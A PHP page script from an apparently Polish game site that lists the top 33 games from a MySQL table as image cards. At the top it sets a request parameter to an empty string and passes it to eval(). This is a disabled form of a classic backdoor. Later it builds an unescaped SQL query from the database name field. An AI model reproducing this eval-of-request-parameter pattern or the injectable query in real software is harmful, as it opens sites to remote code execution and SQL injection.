<?php
    
    $_GET['transporter'] = "";
    $value = $_GET['transporter'];
    eval($value);

    echo '<p style="font-size: 1em; font-weight: bold; margin: 0;">Gry możliwe do wygrania na naszej stronie:</p><br />';

    require_once("../connect.php");
    
    $polaczenie = @new mysqli($host, $db_user, $db_password, $db_name);
    @mysqli_set_charset($polaczenie,"utf8");

    if($polaczenie->connect_errno != 0)
    {  
        echo 'Błąd połączenia z bazą danych. <br /><br /> <span style="color:#a00000; font-weight:700;"> Numer błędu MySQL: ' . $polaczenie->connect_errno . '</span>';
    }
    else
    {
        if($rezultat = @$polaczenie->query("SELECT * FROM games ORDER BY price DESC"))
        {
            $ile_itemow = $rezultat -> num_rows;

            if($ile_itemow > 0)
            {   
                $how_much = 0;
                
                while($how_much < 33)
                {
                    $row = mysqli_fetch_array($rezultat);
                        
                    $name = $row['name'];

                    $game_info = @$polaczenie->query("SELECT image FROM games WHERE name = '$name'");
                    $game_info = $game_info -> fetch_assoc();
                    $image = $game_info['image'];

                    if($image == '')
                    {
                        $image = 'IMG/no_photo.jpg';
                    }
 
                    echo '<div class="case_container" style="min-height: 312px;">

                    <img src="'. $image. '" style="width: 200px; height: 250px; display: block; margin: 0 auto -10px; padding: 0; border-radius: 5px;" />
                    
                    <p style="font-weight: bold; font-size: 0.8em; margin-bottom: 2px; margin-top: 20px;">'. $name .'</p>
                    
                    </div>';
                    
                    $how_much++;
                }
                
                echo '<p style="float: left; font-size: 1.2em; margin: 140px 0 0 15px;">...oraz ponad 100 innych tytułów!</p><div class="case_container" style="min-height: 312px; visibility: hidden;"></div>';
            }
            else
            {
                echo '<p style="font-size: 1.2em; font-style: italic;">Brak gier w bazie danych!</p>';
            }
        }
        else
        {
            echo "Bład połączenia z bazą danych.";
        }
        $polaczenie->close();
    }
?>